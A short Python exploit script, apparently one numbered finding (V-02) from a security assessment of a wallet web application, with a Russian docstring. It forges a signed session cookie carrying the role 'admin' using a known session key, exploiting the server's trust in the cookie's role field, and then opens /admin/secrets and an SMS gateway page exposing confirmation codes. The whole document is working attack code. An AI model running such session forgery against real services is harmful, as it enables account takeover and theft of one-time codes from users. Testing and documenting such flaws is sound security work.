# -*- coding: utf-8 -*-
"""V-02. Подделка сессии с ролью admin.

Роль лежит внутри подписанного значения куки (ow.<uid>.<role>.<hmac>) и после
проверки подписи берётся как есть (auth.go: if role != "" { u.Role = role }).
С известным SESSION_KEY подписываем себе admin и открываем служебные разделы.
"""
from wallet_client import Client, parser, banner, ok, fail


def main():
    a = parser("Подделка admin-сессии").parse_args()

    anon = Client(a.base)
    st, _, _ = anon.get("/admin/secrets")
    banner(f"анонимно /admin/secrets -> {st} (ожидаем 302 на логин)")

    c = Client(a.base)
    c.forge(6, "admin")  # uid 6 = adminw
    st, _, _ = c.get("/admin/secrets")
    if st != 200:
        fail(f"admin-сессия не принята: {st}")
    ok("/admin/secrets открыт с поддельной сессией")

    st, _, body = c.get("/gateway/sms")
    if st != 200:
        fail(f"SMS-шлюз не открыт: {st}")
    ok("/gateway/sms (коды подтверждения) доступен admin-сессии")


if __name__ == "__main__":
    main()
